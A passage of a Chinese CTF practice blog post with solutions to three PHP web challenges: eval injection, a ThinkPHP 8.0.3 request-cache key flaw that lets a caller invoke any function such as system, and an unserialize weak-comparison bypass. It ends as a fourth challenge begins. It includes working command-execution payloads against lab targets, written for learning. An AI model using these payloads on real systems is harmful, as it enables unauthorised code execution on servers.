aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E4%BA%8B/" itemprop="url">CTF赛事</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/CTF%E8%B5%9B%E4%BA%8B/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CTF赛事</span></a></span></div></div><h1 class="post-title" itemprop="name headline">CTF刷题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-14T07:35:57.000Z" title="发表于 2024-07-14 15:35:57">2024-07-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-22T02:31:47.132Z" title="更新于 2024-08-22 10:31:47">2024-08-22</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">12.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>50分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="CTF刷题"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/14/ctf-shua-ti/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/14/ctf-shua-ti/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/14/ctf-shua-ti/"><header><a class="post-meta-categories" href="/categories/CTF%E8%B5%9B%E4%BA%8B/" itemprop="url">CTF赛事</a><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" tabindex="-1" itemprop="url">CTF赛事</a><h1 id="CrawlerTitle" itemprop="name headline">CTF刷题</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-14T07:35:57.000Z" title="发表于 2024-07-14 15:35:57">2024-07-14</time><time itemprop="dateCreated datePublished" datetime="2024-08-22T02:31:47.132Z" title="更新于 2024-08-22 10:31:47">2024-08-22</time></header><h1 id="xgctf2024">[XGCTF2024]</h1>
<h2 id="codeinject">CodeInject</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-comment">#Author: h1xa</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-keyword">eval</span>(<span class="hljs-string">"var_dump((Object)<span class="hljs-subst">$_POST</span>[1]);"</span>);</code></pre>
<p>可以看到接受一个参数1的参数值，然后强转为对象，接着用var_dump函数输出（输出对象的结构和内容）</p>
<p>看着简单，但是分析了wp发现我还是有疑问点。</p>
<p>首先GPT或者本地测试以下，就知道，被强转为对象之后，输入效果如下：</p>
<pre><code class="hljs scss"><span class="hljs-selector-tag">object</span>(stdClass)<span class="hljs-selector-id">#1</span> (<span class="hljs-number">1</span>) { <span class="hljs-selector-attr">[<span class="hljs-string">"scalar"</span>]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) "hello" }</code></pre>
<p>因此为了不让我们执行代码的部分被赋值给scalar，我们可以想到闭合逃逸，最终效果应该如下</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>=<span class="hljs-number">1</span>);<span class="hljs-built_in">system</span>('ls');<span class="hljs-comment">//</span></code></pre>
<p>但是当我尝试改为：<code>1=hello);system('ls');//</code>的时候，就不能执行了，这里问了GPT，给出的解释如下：</p>
<pre><code class="hljs scss"><span class="hljs-comment">// 输入</span>
<span class="hljs-number">1</span>=hello);<span class="hljs-built_in">system</span>('ls');<span class="hljs-comment">//</span>
<span class="hljs-comment">// 结合后的代码</span>
<span class="hljs-built_in">var_dump</span>((Object)hello);<span class="hljs-built_in">system</span>('ls');<span class="hljs-comment">//</span>
<span class="hljs-comment">// 解释</span>
<span class="hljs-built_in">var_dump</span>((Object)hello); <span class="hljs-comment">// 失败，因为 hello 是未定义的常量，会被解释为字符串 'hello'，并产生错误</span>
<span class="hljs-built_in">system</span>('ls'); <span class="hljs-comment">// 不执行，因为前面的错误导致代码未能继续执行</span></code></pre>
<pre><code class="hljs scss">在PHP中，如果一个未定义的标识符出现在代码中，它会被解释为字符串，并产生一个E_NOTICE错误。例如：
echo hello; <span class="hljs-comment">// 输出 "hello" 并产生一个E_NOTICE错误</span>
在你的代码中，<span class="hljs-built_in">var_dump</span>((Object)hello); 中的 hello 被解释为字符串 'hello'，但会产生一个语法错误，导致后续的 <span class="hljs-built_in">system</span>('ls'); 不能被执行。</code></pre>
<p>因此我猜测，靶场对应的环境就是如此，会爆出错误而不能执行后续代码，但当我本地测试发现是可以的。因为不知道如何考察，因此我只能猜测，这与PHP不同版本对应的处理也不同有关。我的是PHP7.4.33，但靶场的版本我找不到。</p>
<p>另外，看了其他师傅的wp发现可以直接这样</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>=<span class="hljs-built_in">system</span>('ls')<span class="hljs-comment">//等价效果：eval("var_dump((Object)system('ls'));");</span></code></pre>
<p>也就是最后面没有分号结尾，也可以正常执行。针对结果来看，只能认为，这是由于执行代码的优先顺序决定的。</p>
<p>上述等价效果在执行的时候，应该是先执行的system函数，然后将得到的值强转为了对象。（GPT的解释意思也是如此）</p>
<h2 id="tpdoor">tpdoor</h2>
<p>题目源码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">BaseController</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Db</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$middleware</span> = [<span class="hljs-string">'think\middleware\AllowCrossDomain'</span>,<span class="hljs-string">'think\middleware\CheckRequestCache'</span>,<span class="hljs-string">'think\middleware\LoadLangPack'</span>,<span class="hljs-string">'think\middleware\SessionInit'</span>];
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$isCache</span> = <span class="hljs-literal">false</span> , <span class="hljs-variable">$cacheTime</span> = <span class="hljs-number">3600</span></span>)</span>
<span class="hljs-function">    </span>{
        
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isCache</span> == <span class="hljs-literal">true</span>){
            <span class="hljs-variable">$config</span> = <span class="hljs-keyword">require</span>  <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">'/../../config/route.php'</span>;
            <span class="hljs-variable">$config</span>[<span class="hljs-string">'request_cache_key'</span>] = <span class="hljs-variable">$isCache</span>;
            <span class="hljs-variable">$config</span>[<span class="hljs-string">'request_cache_expire'</span>] = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$cacheTime</span>);
            <span class="hljs-variable">$config</span>[<span class="hljs-string">'request_cache_except'</span>] = [];
            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">'/../../config/route.php'</span>, <span class="hljs-string">'&lt;?php return '</span>. <span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$config</span>, <span class="hljs-literal">true</span>). <span class="hljs-string">';'</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-string">'cache is enabled'</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-string">'Welcome ,cache is disabled'</span>;
        }
    }

}</code></pre>
<p>上述代码，就是为config/route.php文件进行某些配置修改，思路可以是关注他修改了哪些值，我们可以跟踪这些值的去向，或许就有发现。</p>
<p>首先是信息搜集，这里看到<code>$config['request_cache_key'] = $isCache;</code>，我们可以搜一下对应的tp版本。</p>
<p>这里我觉得我只能看tp的github一个个找，才能找到源码，否则，真不能根据关键词直接定位。这里看到tp的framework的8.0.3含有request_cache_key关键词，下载源码看一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620463.png" alt="image-20240711122320854"></p>
<p>全局搜索能看到上图所示位置，我们跟踪request_cache_key去向，如下图，这里判断cache变量是否为空，是空的话就调用getRequestCache函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620464.png" alt="image-20240711123154195"></p>
<p>这里根据config信息，进行赋值然后返回一个数组</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620465.png" alt="image-20240711123415010"></p>
<p>继续跟进，这里先是判断cache是否是数组，很明显上一步返回的就是数组，然后他会填充该数组，使得数组的长度一定是3，随后调用parseCacheKey函数，我们跟进</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620466.png" alt="image-20240711123600262"></p>
<pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseCacheKey</span>(<span class="hljs-params"><span class="hljs-variable">$request</span>, <span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Closure</span>) {
            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$request</span>);
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$key</span>) {
            <span class="hljs-comment">// 关闭当前缓存</span>
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$key</span>) {
            <span class="hljs-comment">// 自动缓存功能</span>
            <span class="hljs-variable">$key</span> = <span class="hljs-string">'__URL__'</span>;
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">'|'</span>)) {
            [<span class="hljs-variable">$key</span>, <span class="hljs-variable">$fun</span>] = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$key</span>);
        }

        <span class="hljs-comment">// 特殊规则替换</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">'__'</span>)) {
            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>([<span class="hljs-string">'__CONTROLLER__'</span>, <span class="hljs-string">'__ACTION__'</span>, <span class="hljs-string">'__URL__'</span>], [<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">controller</span>(), <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">action</span>(), <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">url</span>(<span class="hljs-literal">true</span>))], <span class="hljs-variable">$key</span>);
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">':'</span>)) {
            <span class="hljs-variable">$param</span> = <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">param</span>();

            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$param</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span> =&gt; <span class="hljs-variable">$val</span>) {
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>) &amp;&amp; <span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">':'</span> . <span class="hljs-variable">$item</span>)) {
                    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">':'</span> . <span class="hljs-variable">$item</span>, (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$val</span>, <span class="hljs-variable">$key</span>);
                }
            }
        } <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">']'</span>)) {
            <span class="hljs-keyword">if</span> (<span class="hljs-string">'['</span> . <span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">ext</span>() . <span class="hljs-string">']'</span> == <span class="hljs-variable">$key</span>) {
                <span class="hljs-comment">// 缓存某个后缀的请求</span>
                <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$request</span>-&gt;<span class="hljs-title function_ invoke__">url</span>());
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span>;
            }
        }

        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fun</span>)) {
            <span class="hljs-variable">$key</span> = <span class="hljs-variable">$fun</span>(<span class="hljs-variable">$key</span>);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;
    }
}</code></pre>
<p>可以看到上述会先对key参数做判断，由于key这里我们是可控的，因此我们可以让其进入到这段代码：</p>
<pre><code class="hljs php">} <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">str_contains</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">'|'</span>)) {
            [<span class="hljs-variable">$key</span>, <span class="hljs-variable">$fun</span>] = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'|'</span>, <span class="hljs-variable">$key</span>);
        }</code></pre>
<p>如果我们给key赋值为1|2类似形式，那就会进入上述代码，然后由|分割成为数组，然后继续判断最后来到这里</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fun</span>)) {
            <span class="hljs-variable">$key</span> = <span class="hljs-variable">$fun</span>(<span class="hljs-variable">$key</span>);
        }

        <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;</code></pre>
<p>简单判断fun是否存在，然后就调用fun函数，传入key值，很明显这里我们可以构造任意函数来执行命令</p>
<pre><code class="hljs scss">?s=index/index/&amp;isCache=cat /<span class="hljs-number">000</span>*|system&amp;cacheTime=-<span class="hljs-number">1</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620467.png" alt="image-20240711171743913"></p>
<h1 id="hubuctf-2022-新生赛">[HUBUCTF 2022 新生赛]</h1>
<h2 id="checkin">checkin</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$username</span>  = <span class="hljs-string">"this_is_secret"</span>; 
<span class="hljs-variable">$password</span>  = <span class="hljs-string">"this_is_not_known_to_you"</span>; 
<span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<span class="hljs-comment">//here I changed those two </span>
<span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'info'</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'info'</span>]: <span class="hljs-string">""</span> ;
<span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">'username'</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">'password'</span>]==<span class="hljs-variable">$password</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"username or password error!"</span>;

}

<span class="hljs-meta">?&gt;</span>
username <span class="hljs-keyword">or</span> password error!</code></pre>
<p>刚开始被骗了，满足上述条件出不来flag，看了评论知道，猜测题目给的就是假的，所以考的是弱比较，直接赋值为true即可</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$test</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"username"</span>=&gt;<span class="hljs-literal">true</span>, <span class="hljs-string">"password"</span>=&gt;<span class="hljs-literal">true</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);
<span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407151620469.png" alt="image-20240714154701028"></p>
<h2 id="howtogetshell">HowToGetShell</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
